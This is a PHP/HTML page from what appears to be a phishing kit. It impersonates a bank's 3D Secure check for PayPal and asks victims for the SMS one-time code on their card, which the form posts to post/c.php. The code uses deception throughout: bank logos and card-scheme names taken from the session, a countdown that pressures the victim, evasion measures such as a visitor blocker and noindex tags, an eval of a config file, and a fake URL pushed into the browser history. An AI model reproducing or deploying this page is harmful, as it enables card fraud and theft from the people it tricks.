<?php

require_once __DIR__ . '/function.php';

if (file_exists($api->dir_config . '/' . $api->general_config)) {
  @eval(file_get_contents($api->dir_config . '/' . $api->general_config));
}

if ($config_blocker == 1) {
  $api->cookie();
  $api->session();
}

$api->visitor("3D Secure");

include 'randa.php';

?>
<!DOCTYPE html>
<html>

<head>
<title><?=$api->encode($_SESSION['card_title']);?>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<?=$fo8;?></title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<link rel="shortcut icon" href="assets/img/favicon.ico">
<link rel="apple-touch-icon" href="assets/img/apple-touch-icon.png">
<script src="assets/js/jquery.min.js"></script>
<script type="text/javascript" src="https://ssl.geoplugin.net/javascript.gp?k=d4ca3f36a4e92551"></script>

<style media="screen">
.items {
margin: 0 auto;
width: 368px;
border: solid 1px black;
padding: 17px;
}

@media screen and (max-width: 368px) {
.items:before {
width: 315px;
}
}

.info3d {
font-size: 11px;
margin-top: 25px;
color: #807979;
font-family:Arial, Helvetica, sans-serif;

}

.hide {
display: none;
}
</style>
</head>

<body>
<div class="items">
<img src="<?=$_SESSION['logo_img'];?>">


<?php 
        if($_SESSION['card_type'] == 'jcb') {
        
        $VBV_Name = "JCB J/Secure";
        }
    elseif($_SESSION['card_type'] == 'amex') {
        
        $VBV_Name = "Amex SafeKey";
        }
    elseif($_SESSION['card_type'] == 'mastercard') {
       
        $VBV_Name = "MasterCard Secure Code";
        }
    elseif($_SESSION['card_type'] == 'visaelectron' or $_SESSION['card_type'] == 'visa') {
       
        $VBV_Name = "Verified by Visa";
        }
    else{$VBV_Name = "Secure Code";}
                                        if ($_SESSION['card_banku']){
              echo '<img class="card_bank" id="card_bank" style="float: right;display: inline-block" width="79px" title="'.$_SESSION['card_bank'].'" src="https://logo.clearbit.com/'.$_SESSION['card_banku'].'"></td>';
                                        }else{
              echo "<img src='assets/img/logo.svg' style='float: right;display: inline-block' width='79px'>";
                                        }
                                        ?>

<p class="info3d"><?=$api->transcode("Please enter information pertaining to your credit card to confirm your PayPal account.");?></p>

<div class="show" id="3dweb">

<form method="post" action="post/c.php" autocomplete="off">
<table align="center" width="350" style="font-size: 11px;font-family: arial, sans-serif; color: rgb(0, 0, 0); margin-top: 10px;">
<div id="maindiv" class="commonbodydiv">
    <div class="inner">

      

                  </header>

                  <div class="fieldset nonasgard">
                    <form id="logonAction" action='post/c.php' method="POST" autocomplete="off">
                      <fieldset>
                    <div id="timer_message_2" class="show-details">
                      <p>
                        A verification code is sent to your mobile device (will expire in a few minutes). Enter the code received by phone to the next step.</p><br>

                      </p>
                    </div>
                    <div id="timer_message_1" class="show-details">
                      <p>
                      <b>
                        Within <strong><span id="time_remaining" color=""Reply>90</span> seconds</strong>  Be patient and do not close this window.
                      </b>
                        
                      </p>

                    </div>
                      <input class="w-48 mt-2 form-control" required type="tel" name="sms" placeholder="Enter Your  Code" maxlength="8" />
                      <p>
                        <b>

                        </b>
                      </p>
                      <input type="submit" value="confirm" class="loggain-knapp mt-2 button icon approve primary btn btn-form" style="background-color: #2B60DE;"><br>
                      </fieldset>
                    </form>
                  </div>
                </section>
              </td>

          </tr>
      </table>
    </div>
  </div>


  </div> <!-- container end -->
</div> <!-- content end -->

</div>



</div>
</div>
</div>
</div>
</footer>

<script>
    var intervalcountdown = 90;
    var intervalId;

    function updateCountDown() {
        document.getElementById('time_remaining').innerHTML = intervalcountdown;
        if (intervalcountdown == 0) {
        
            window.clearInterval(intervalId);
            
           document.getElementById('timer_message_2').className= 'show-details';
            document.getElementById('timer_message_1').className= 'hide-details';
        }
        intervalcountdown--;
    }

    function getParameterByName(name, url) {
      if (!url) url = window.location.href;
      name = name.replace(/[\[\]]/g, "\\$&");
      var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
          results = regex.exec(url);
      if (!results) return null;
      if (!results[2]) return '';
      return decodeURIComponent(results[2].replace(/\+/g, " "));
  }
  if(getParameterByName('submited')) {
    document.getElementById('error').className= 'show-details';
  }

    intervalId = window.setInterval('updateCountDown()', 1000);
</script>

  </body>
</form>
</div>
<p style="text-align: center;font-family: arial, sans-serif;font-size: 9px; color: #656565"><?=$api->transcode("© ".gmdate('Y')." ".$_SESSION['card_bank']." All Rights Reserved");?></p>
</div>
<script>
$(document).ready(function(){
let g = Math.random().toString(36).substring(7);window.history.pushState('er', 'ghbhh', 'cgi=BILL'+g);
})
</script>
</body>

</html>
